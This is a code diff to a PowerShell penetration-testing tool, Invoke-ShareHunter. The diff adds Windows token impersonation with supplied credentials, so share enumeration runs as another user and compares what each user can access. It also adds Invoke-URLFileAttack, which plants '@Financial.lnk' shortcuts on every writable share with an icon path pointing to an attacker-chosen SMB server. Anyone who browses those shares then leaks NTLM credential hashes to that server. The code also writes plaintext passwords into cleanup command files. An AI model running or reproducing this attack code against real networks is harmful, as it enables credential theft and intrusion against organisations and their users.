@@ -63,12 +63,31 @@ function Invoke-ShareHunter{
 		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
 		[String]
 		$Timeout,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Username,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Password,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$UserDomain,
 
   		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
 		[switch]
 		$ReadOnly
 		
 	)
+	
+	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
+		Write-Output ""
+		Write-Output "[-] Please provide Username, Password, and UserDomain"
+		Write-Output ""
+		return
+	}
 	
 	$ErrorActionPreference = "SilentlyContinue"
 	
@@ -256,7 +275,98 @@ function Invoke-ShareHunter{
 
 	foreach ($obj in $functiontable) {
 		$scriptBlock = {
-			param($obj)
+			param($obj, $Username, $Password, $UserDomain)
+			
+			# Define the required constants and structs
+			Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public enum LogonType : int {
+    LOGON32_LOGON_NEW_CREDENTIALS = 9,
+}
+
+public enum LogonProvider : int {
+    LOGON32_PROVIDER_DEFAULT = 0,
+}
+
+public enum TOKEN_TYPE {
+    TokenPrimary = 1,
+    TokenImpersonation
+}
+
+public enum TOKEN_ACCESS : uint {
+    TOKEN_DUPLICATE = 0x0002
+}
+
+public enum PROCESS_ACCESS : uint {
+    PROCESS_QUERY_INFORMATION = 0x0400
+}
+
+public class Advapi32 {
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool LogonUser(
+        String lpszUsername,
+        String lpszDomain,
+        String lpszPassword,
+        LogonType dwLogonType,
+        LogonProvider dwLogonProvider,
+        out IntPtr phToken
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool RevertToSelf();
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hToken);
+}
+
+public class Kernel32 {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+}
+"@ -Language CSharp
+
+			function Token-Impersonation {
+				param (
+					[Parameter(Mandatory=$true)]
+					[string]$Username,
+
+					[Parameter(Mandatory=$true)]
+					[string]$Password,
+
+					[Parameter(Mandatory=$true)]
+					[string]$Domain
+				)
+
+				process {
+					$tokenHandle = [IntPtr]::Zero
+					if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
+						throw "[-] Failed to obtain user token."
+					}
+
+					if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
+						[Advapi32]::CloseHandle($tokenHandle)
+						throw "[-] Failed to impersonate user."
+					}
+				}
+			}
+
+			function Revert-Token {process {[Advapi32]::RevertToSelf()}}
+			
+			# Impersonate User
+			if($Username -AND $Password -AND $UserDomain){
+				Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
+			}
 
 			$Error.clear()
 			ls $obj.FullShareName > $null
@@ -266,9 +376,12 @@ function Invoke-ShareHunter{
 			} else {
 				return $null
 			}
+			
+			# Revert Token
+			if($Username -AND $Password -AND $UserDomain){Revert-Token}
 		}
 
-		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($obj)
+		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($obj).AddArgument($Username).AddArgument($Password).AddArgument($UserDomain)
 		$runspace.RunspacePool = $runspacePool
 
 		$runspaces += [PSCustomObject]@{
@@ -303,9 +416,17 @@ function Invoke-ShareHunter{
 	Write-Output "[+] Readable Shares:"
 	Write-Output ""
 	$filteredReadableShares
-	$filteredReadableShares | Out-File $pwd\Shares_Readable.txt -Force
-	Write-Output ""
-	Write-Output "[+] Output saved to: $pwd\Shares_Readable.txt"
+	if($Username -AND $Password -AND $UserDomain){
+		$filteredReadableShares | Out-File $pwd\Shares_$($Username)_Readable.txt -Force
+		Write-Output ""
+		Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Readable.txt"
+	}
+	else{
+		$filteredReadableShares | Out-File $pwd\Shares_Readable.txt -Force
+		Write-Output ""
+		Write-Output "[+] Output saved to: $pwd\Shares_Readable.txt"
+	}
+	
 	Write-Output ""
  	if(!$ReadOnly){
 		Write-Output ""
@@ -319,10 +440,98 @@ function Invoke-ShareHunter{
 		foreach ($Share in $ReadableShares) {
 			$scriptBlock = {
 				
-				param(
-					[Parameter(Mandatory=$true)]
-					[string]$Share
-				)
+				param($Share, $Username, $Password, $UserDomain)
+				
+				# Define the required constants and structs
+				Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public enum LogonType : int {
+	LOGON32_LOGON_NEW_CREDENTIALS = 9,
+}
+
+public enum LogonProvider : int {
+	LOGON32_PROVIDER_DEFAULT = 0,
+}
+
+public enum TOKEN_TYPE {
+	TokenPrimary = 1,
+	TokenImpersonation
+}
+
+public enum TOKEN_ACCESS : uint {
+	TOKEN_DUPLICATE = 0x0002
+}
+
+public enum PROCESS_ACCESS : uint {
+	PROCESS_QUERY_INFORMATION = 0x0400
+}
+
+public class Advapi32 {
+	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+	public static extern bool LogonUser(
+		String lpszUsername,
+		String lpszDomain,
+		String lpszPassword,
+		LogonType dwLogonType,
+		LogonProvider dwLogonProvider,
+		out IntPtr phToken
+	);
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+	
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool RevertToSelf();
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern bool CloseHandle(IntPtr hToken);
+}
+
+public class Kernel32 {
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+}
+"@ -Language CSharp
+
+				function Token-Impersonation {
+					param (
+						[Parameter(Mandatory=$true)]
+						[string]$Username,
+
+						[Parameter(Mandatory=$true)]
+						[string]$Password,
+
+						[Parameter(Mandatory=$true)]
+						[string]$Domain
+					)
+
+					process {
+						$tokenHandle = [IntPtr]::Zero
+						if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
+							throw "[-] Failed to obtain user token."
+						}
+
+						if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
+							[Advapi32]::CloseHandle($tokenHandle)
+							throw "[-] Failed to impersonate user."
+						}
+					}
+				}
+
+				function Revert-Token {process {[Advapi32]::RevertToSelf()}}
+				
+				# Impersonate User
+				if($Username -AND $Password -AND $UserDomain){
+					Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
+				}
 				
 				function Test-Write {
 					[CmdletBinding()]
@@ -357,7 +566,7 @@ function Invoke-ShareHunter{
 			}
 	
 	
-			$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Share)
+			$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Share).AddArgument($Username).AddArgument($Password).AddArgument($UserDomain)
 	
 			$runspace.RunspacePool = $runspacePool
 	
@@ -366,6 +575,9 @@ function Invoke-ShareHunter{
 				Status   = $runspace.BeginInvoke()
 				Share    = $Share
 			}
+			
+			# Revert Token
+			if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
 		}
 	
 		# Initialize an array to store all writable shares
@@ -395,9 +607,16 @@ function Invoke-ShareHunter{
 		Write-Output "[+] Writable Shares:"
 		Write-Output ""
 		$WritableShares
-		$WritableShares | Out-File $pwd\Shares_Writable.txt -Force
-		Write-Output ""
-		Write-Output "[+] Output saved to: $pwd\Shares_Writable.txt"
+		if($Username -AND $Password -AND $UserDomain){
+			$WritableShares | Out-File $pwd\Shares_$($Username)_Writable.txt -Force
+			Write-Output ""
+			Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Writable.txt"
+		}
+		else{
+			$WritableShares | Out-File $pwd\Shares_Writable.txt -Force
+			Write-Output ""
+			Write-Output "[+] Output saved to: $pwd\Shares_Writable.txt"
+		}		
 		Write-Output ""
 		
 		$FinalTable = @()
@@ -420,11 +639,40 @@ function Invoke-ShareHunter{
 		}
 		
 		$FinalResults = $FinalTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | ft -Autosize -Wrap
-		$FinalResults
-		
-		$FinalResults | Out-File $pwd\Shares_Results.txt -Force
-		Write-Output "[+] Output saved to: $pwd\Shares_Results.txt"
 		Write-Output ""
+		Write-Output "[+] Results Table:"
+		$FinalResults
+		if($Username -AND $Password -AND $UserDomain){
+			$FinalResults | Out-File $pwd\Shares_$($Username)_Results.txt -Force
+			Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Results.txt"
+			Write-Output ""
+			if(Test-Path $pwd\Shares_Readable.txt){
+				$CompReadableShares = Get-Content -Path "$pwd\Shares_Readable.txt"
+				$CompResultsShares = Get-Content -Path "$pwd\Shares_$($Username)_Readable.txt"
+				Write-Output ""
+				Write-Output "[+] Shares readable by $Username that $env:USERNAME cannot read:"
+				Write-Output ""
+				$differences = Compare-Object -ReferenceObject $CompReadableShares -DifferenceObject $CompResultsShares -PassThru | Where-Object { $_.SideIndicator -eq '=>' }
+				$differences | ForEach-Object { Write-Output "$_" }
+				Write-Output ""
+				Write-Output ""
+			}
+		}
+		else{
+			$FinalResults | Out-File $pwd\Shares_Results.txt -Force
+			Write-Output "[+] Output saved to: $pwd\Shares_Results.txt"
+			Write-Output ""
+		}
+		Write-Output "[+] To perform a URLFile Attack run the following command:"
+		Write-Output ""
+		if($Username -and $Password -and $UserDomain){
+			Write-Output "Invoke-URLFileAttack -WritableShares `"$pwd\Shares_$($Username)_Writable.txt`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
+			Write-Output ""
+		}
+		else{
+			Write-Output "Invoke-URLFileAttack -WritableShares `"$pwd\Shares_Writable.txt`""
+			Write-Output ""
+		}
   	}
 }
 
@@ -459,3 +707,309 @@ function Get-ADComputers {
 
     return $allcomputers | Sort-Object -Unique
 }
+
+function Invoke-URLFileAttack{
+	[CmdletBinding()] Param(
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Username,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Password,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$UserDomain,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[ValidateScript({
+			if ($_ -match '[<>:"/\\|?*]') {
+				throw "The value for URLAttackFileName contains invalid characters. Please provide a name without any of the following characters: < > : `" / \ | ? *"
+			}
+			return $true
+		})]
+		[String]
+		$URLAttackFileName,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$SMBServerIP,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$WritableShares
+	)
+	
+	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
+		Write-Output ""
+		Write-Output "[-] Please provide Username, Password, and UserDomain"
+		Write-Output ""
+		return
+	}
+	
+	elseif($Username -AND $Password -AND $UserDomain){
+		Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
+	}
+	
+	if(!$SMBServerIP){
+		Write-Output ""
+		Write-Output "[-] Please provide the IP address of your SMB Server using the -SMBServerIP parameter (e.g.: -SMBServerIP `"10.0.2.10`")"
+		Write-Output ""
+		return
+	}
+	
+	if(!$WritableShares){
+		Write-Output ""
+		Write-Output "[-] Please provide the location of the file containing a list of Writable Shares using the -WritableShares parameter (e.g.: -WritableShares `"C:\Users\Public\Documents\Shares_Writable.txt`")"
+		Write-Output ""
+		return
+	}
+	
+	Write-Output ""
+	Write-Output "[+] URL File Attack in progress..."
+	Write-Output ""
+	Write-WARNING "Don't forget to clean after yourself once you are done with this attack..."
+	Write-Output ""
+	
+	if($URLAttackFileName){
+		Write-Output "[*] File Name: @$URLAttackFileName"
+		Write-Output ""
+	}
+	else{
+		$URLAttackFileName = "Financial"
+		Write-Output "[*] File Name: @$URLAttackFileName"
+		Write-Output ""
+	}
+	
+	$FailedURLFileAttack = @()
+	
+	Get-Content $WritableShares | ForEach-Object {
+		$filePath = Join-Path -Path $_ -ChildPath "\@$URLAttackFileName.lnk"
+		try{
+			$jwsh = new-object -ComObject wscript.shell
+			$jshortcut = $jwsh.CreateShortcut($filePath)
+			$jshortcut.IconLocation = "\\$SMBServerIP\test.ico"
+			$jshortcut.Save()
+		}
+		catch{$FailedURLFileAttack += "$filePath"}
+	}
+	
+	Write-Output "[+] Done"
+	Write-Output ""
+	if($FailedURLFileAttack){
+		Write-Output "[-] The following shortcuts failed to be created:"
+		Write-Output ""
+		foreach($FileFailed in $FailedURLFileAttack){
+			Write-Output "$FileFailed"
+		}
+		Write-Output ""
+	}
+	Write-Output "[+] To clean-up after this attack run the following command:"
+	Write-Output ""
+	if($Username -and $Password -and $UserDomain){
+		$CleanupHeader = "[+] To clean-up after this attack run the following command:"
+		$CleanupCommand = "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
+		if (-Not (Test-Path -Path "$pwd\Shares_$($Username)_CleanupCommand.txt")) {New-Item -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -ItemType File -Force > $null}
+		$CleanupHeader | Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt"
+		Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -Value ""
+		$CleanupCommand | Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt"
+		Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -Value ""
+		Write-Output "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
+		Write-Output ""
+	}
+	else{
+		$CleanupHeader = "[+] To clean-up after this attack run the following command:"
+		$CleanupCommand = "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
+		if (-Not (Test-Path -Path "$pwd\Shares_CleanupCommand.txt")) {New-Item -Path "$pwd\Shares_CleanupCommand.txt" -ItemType File -Force > $null}
+		$CleanupHeader | Add-Content -Path "$pwd\Shares_CleanupCommand.txt"
+		Add-Content -Path "$pwd\Shares_CleanupCommand.txt" -Value ""
+		$CleanupCommand | Add-Content -Path "$pwd\Shares_CleanupCommand.txt"
+		Add-Content -Path "$pwd\Shares_CleanupCommand.txt" -Value ""
+		Write-Output "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`""
+		Write-Output ""
+	}
+	
+	# Revert Token
+	if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
+	
+	return
+}
+
+function Invoke-URLFileClean{
+	[CmdletBinding()] Param(
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Username,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$Password,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$UserDomain,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[ValidateScript({
+			if ($_ -match '[<>:"/\\|?*]') {
+				throw "The value for URLAttackFileName contains invalid characters. Please provide a name without any of the following characters: < > : `" / \ | ? *"
+			}
+			return $true
+		})]
+		[String]
+		$URLAttackFileName,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$SMBServerIP,
+		
+		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[String]
+		$WritableShares
+	)
+	
+	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
+		Write-Output ""
+		Write-Output "[-] Please provide Username, Password, and UserDomain"
+		Write-Output ""
+		return
+	}
+	
+	elseif($Username -AND $Password -AND $UserDomain){
+		Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
+	}
+	
+	if(!$WritableShares){
+		Write-Output ""
+		Write-Output "[-] Please provide the location of the file containing a list of Writable Shares using the -WritableShares parameter (e.g.: -WritableShares `"C:\Users\Public\Documents\Shares_Writable.txt`")"
+		Write-Output ""
+		return
+	}
+	
+	Write-Output ""
+	Write-Output "[+] Cleaning after a previous URL File attack..."
+	Write-Output ""
+	
+	if($URLAttackFileName){
+		Write-Output "[*] File Name: @$URLAttackFileName"
+		Write-Output ""
+	}
+	else{
+		$URLAttackFileName = "Financial"
+		Write-Output "[*] File Name: @$URLAttackFileName"
+		Write-Output ""
+	}
+	
+	$FailedURLFileClean = @()
+	
+	Get-Content $WritableShares | ForEach-Object {
+		$filePath = Join-Path -Path $_ -ChildPath "\@$URLAttackFileName.lnk"
+		try{Remove-Item -Path $filePath -Force -ErrorAction Stop}
+		catch{$FailedURLFileClean += $filePath}
+	}
+	
+	Write-Output "[+] Done"
+	Write-Output ""
+	if($FailedURLFileClean){
+		Write-Output "[-] The following shortcuts failed to be deleted:"
+		Write-Output ""
+		foreach($FileFailed in $FailedURLFileClean){
+			Write-Output "$FileFailed"
+		}
+		Write-Output ""
+	}
+	
+	# Revert Token
+	if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
+	
+	return
+}
+
+# Define the required constants and structs
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public enum LogonType : int {
+	LOGON32_LOGON_NEW_CREDENTIALS = 9,
+}
+
+public enum LogonProvider : int {
+	LOGON32_PROVIDER_DEFAULT = 0,
+}
+
+public enum TOKEN_TYPE {
+	TokenPrimary = 1,
+	TokenImpersonation
+}
+
+public enum TOKEN_ACCESS : uint {
+	TOKEN_DUPLICATE = 0x0002
+}
+
+public enum PROCESS_ACCESS : uint {
+	PROCESS_QUERY_INFORMATION = 0x0400
+}
+
+public class Advapi32 {
+	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+	public static extern bool LogonUser(
+		String lpszUsername,
+		String lpszDomain,
+		String lpszPassword,
+		LogonType dwLogonType,
+		LogonProvider dwLogonProvider,
+		out IntPtr phToken
+	);
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+	
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool RevertToSelf();
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+	public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern bool CloseHandle(IntPtr hToken);
+}
+
+public class Kernel32 {
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+}
+"@ -Language CSharp
+
+function Token-Impersonation {
+	param (
+		[Parameter(Mandatory=$true)]
+		[string]$Username,
+
+		[Parameter(Mandatory=$true)]
+		[string]$Password,
+
+		[Parameter(Mandatory=$true)]
+		[string]$Domain
+	)
+
+	process {
+		$tokenHandle = [IntPtr]::Zero
+		if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
+			throw "[-] Failed to obtain user token."
+		}
+
+		if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
+			[Advapi32]::CloseHandle($tokenHandle)
+			throw "[-] Failed to impersonate user."
+		}
+	}
+}
+
+function Revert-Token {process {[Advapi32]::RevertToSelf()}}
